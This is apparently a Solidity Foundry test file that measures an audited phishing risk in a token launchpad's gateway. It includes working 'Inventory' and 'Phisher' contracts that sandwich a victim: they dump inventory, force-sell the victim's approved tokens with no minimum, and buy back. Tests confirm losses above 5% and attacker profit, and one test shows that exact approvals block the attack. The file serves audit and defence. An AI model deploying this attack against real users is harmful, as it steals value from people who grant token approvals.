// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {GangFixture} from "../utils/GangFixture.sol";
import {IGangLaunchpad} from "../../src/gang/interfaces/IGangLaunchpad.sol";
import {GangLaunchpad} from "../../src/gang/GangLaunchpad.sol";
import {GangPadRegistry} from "../../src/gang/GangPadRegistry.sol";
import {GangGateway} from "../../src/router/GangGateway.sol";
import {IGangGateway} from "../../src/router/interfaces/IGangGateway.sol";
import {GangRouterDeployLib as R} from "../../script/GangRouterDeployLib.sol";
import {GangPadRegistryDeployLib as RG} from "../../script/GangPadRegistryDeployLib.sol";
import {GangGatewayDeployLib as G} from "../../script/GangGatewayDeployLib.sol";

/// @dev Attacker inventory wallet (from the 2026-10-30 independent audit, M-1): an Agent-holding account whose code anyone (the phisher) can drive. On mainnet this
///      is an Agent-ID EOA delegated with EIP-7702, or a bundle [sell inventory, victim tx, buy back].
contract Inventory {
    GangLaunchpad public immutable pad;
    IERC20 public immutable wbnb;

    constructor(GangLaunchpad pad_, IERC20 wbnb_) {
        pad = pad_;
        wbnb = wbnb_;
        wbnb_.approve(address(pad_), type(uint256).max);
    }

    function buy(address t, uint256 q) external returns (uint256) {
        return pad.buy(t, q, 0);
    }

    function sellAll(address t) external {
        IERC20(t).approve(address(pad), type(uint256).max);
        pad.sell(t, IERC20(t).balanceOf(address(this)), 0);
    }

    /// @dev buy back (at least) `a` tokens: CurveLogic's inverse, gross of the 1% fee
    function buyBack(address t, uint256 a) external {
        (,, uint128 rq, uint128 sold,, uint128 vq,,,,,,) = pad.curves(t);
        uint256 VT = pad.VIRTUAL_TOKEN();
        uint256 k = uint256(vq) * VT;
        uint256 net = Math.ceilDiv(k, VT - sold - a) - (uint256(vq) + rq);
        uint256 gross = Math.ceilDiv(net * 10_000, 9_900) + 1;
        pad.buy(t, gross, a);
    }
}

contract Phisher {
    IGangGateway immutable gw;

    constructor(IGangGateway gw_) {
        gw = gw_;
    }

    function claim(address t, Inventory[] calldata inv, uint256[] calldata held) external {
        for (uint256 i; i < inv.length; i++) {
            inv[i].sellAll(t);
        }
        gw.sellToken(0, t, tx.origin, IERC20(t).balanceOf(tx.origin), 0, 500, address(this));
        for (uint256 i; i < inv.length; i++) {
            inv[i].buyBack(t, held[i]);
        }
    }

    receive() external payable {}
}

/// @notice The accepted residual risk of the open sell path, measured (AUDIT-BRIEF §25, audit M-1): a contract the
///         user is tricked into calling dumps the attacker's own inventory on the curve, force-sells the user's
///         approved tokens with no minimum at the depressed price, and buys the inventory back — all in the user's tx
///         (an Agent EOA delegated with EIP-7702, an Agent-holding contract, or a bundle around the user's tx). The
///         proceeds still go to the user, but the loss is bounded by the attacker's inventory, not by the 5% router
///         fee. Exact approvals (spent to 0 by each sell) leave nothing to force-sell later.
contract GangGatewayPhishingTest is GangFixture {
    GangPadRegistry internal reg;
    GangGateway internal gw;
    address internal creator;
    address internal alice;

    function setUp() public {
        _deployGang(makeAddr("keeper"));
        address[] memory pads = new address[](1);
        pads[0] = address(pad);
        reg = GangPadRegistry(RG.deploy(owner, pads).proxy);
        G.Gateway memory stack = G.deploy(address(reg), address(wbnb), owner, R.MAINNET_MIN_DELAY);
        gw = GangGateway(payable(stack.proxy));
        vm.prank(owner);
        pad.setRouter(address(gw), true);
        creator = _newAgent();
        alice = _newAgent();
    }

    function _push(address t, uint256 target) internal {
        for (uint256 i; i < 2000 && _curveRealQuote(t) < target; i++) {
            address w = _newAgent();
            vm.prank(w);
            pad.buy(t, 0.5 ether, 0);
        }
    }

    function _inventory(address t, uint256 n) internal returns (Inventory[] memory inv, uint256[] memory held) {
        inv = new Inventory[](n);
        held = new uint256[](n);
        for (uint256 i; i < n; i++) {
            inv[i] = new Inventory(pad, IERC20(address(wbnb)));
            agents.mint(address(inv[i]), 10_000 + _nextAgentId++);
            wbnb.mintUnlimited(address(inv[i]), 100 ether);
            inv[i].buy(t, 5 ether); // capped at 10M tokens
            held[i] = IERC20(t).balanceOf(address(inv[i]));
        }
    }

    function _wbnbOf(Inventory[] memory inv) internal view returns (uint256 s) {
        for (uint256 i; i < inv.length; i++) {
            s += wbnb.balanceOf(address(inv[i]));
        }
    }

    /// @return lossBps the victim's loss against a fair sell with no router fee
    /// @return attackerPnl what the attacker gained (inventory WBNB change + router fee)
    function _sandwich(uint256 progress, uint256 n) internal returns (uint256 lossBps, int256 attackerPnl) {
        address t = _createV3(creator, address(0), _tax(0, 0, 0, address(0)));
        _push(t, progress);
        // victim at the 1% cap, unlimited approval to the gateway
        vm.prank(alice, alice);
        gw.buyTokenAMAP{value: 5 ether}(t, alice, 5 ether, 0);
        uint256 y = IERC20(t).balanceOf(alice);
        vm.prank(alice);
        IERC20(t).approve(address(gw), type(uint256).max);
        (Inventory[] memory inv, uint256[] memory held) = _inventory(t, n);

        uint256 snap = vm.snapshotState();
        uint256 b0 = alice.balance;
        vm.prank(alice, alice);
        gw.sellToken(0, t, alice, y, 0, 0, address(0));
        uint256 fair = alice.balance - b0;
        vm.revertToState(snap);

        Phisher ph = new Phisher(IGangGateway(address(gw)));
        uint256 w0 = _wbnbOf(inv);
        b0 = alice.balance;
        vm.prank(alice, alice);
        ph.claim(t, inv, held);
        uint256 got = alice.balance - b0;
        for (uint256 i; i < n; i++) {
            assertGe(IERC20(t).balanceOf(address(inv[i])), held[i], "inventory restored");
        }
        assertEq(IERC20(t).balanceOf(alice), 0, "victim sold out");
        lossBps = ((fair - got) * 10_000) / fair;
        attackerPnl = int256(_wbnbOf(inv)) - int256(w0) + int256(address(ph).balance);
    }

    function test_sandwich_oneWallet_lossAboveRouterFee() public {
        (uint256 lossBps, int256 pnl) = _sandwich(7 ether, 1);
        assertGt(lossBps, 500, "beyond the 5% router fee");
        assertGt(pnl, 0, "attacker profits");
    }

    function test_sandwich_fiveWallets_lossGrowsWithInventory() public {
        (uint256 lossBps, int256 pnl) = _sandwich(10 ether, 5);
        assertGt(lossBps, 2_500, "a quarter and more");
        assertGt(pnl, 0, "attacker profits");
    }

    /// @dev The mitigation the integration guide asks for: an exact approval is spent by the user's own sell, so a
    ///      later phishing call finds nothing to sell.
    function test_exactApproval_leavesNothingToForceSell() public {
        address t = _createV3(creator, address(0), _tax(0, 0, 0, address(0)));
        vm.prank(alice, alice);
        gw.buyTokenAMAP{value: 0.02 ether}(t, alice, 0.02 ether, 0);
        uint256 y = IERC20(t).balanceOf(alice);
        vm.prank(alice);
        IERC20(t).approve(address(gw), y / 2);
        vm.prank(alice, alice);
        gw.sellToken(0, t, alice, y / 2, 0, 0, address(0));
        assertEq(IERC20(t).allowance(alice, address(gw)), 0);

        Phisher ph = new Phisher(IGangGateway(address(gw)));
        Inventory[] memory none = new Inventory[](0);
        vm.prank(alice, alice);
        vm.expectRevert();
        ph.claim(t, none, new uint256[](0));
        assertEq(IERC20(t).balanceOf(alice), y - y / 2, "the rest is untouched");
    }
}
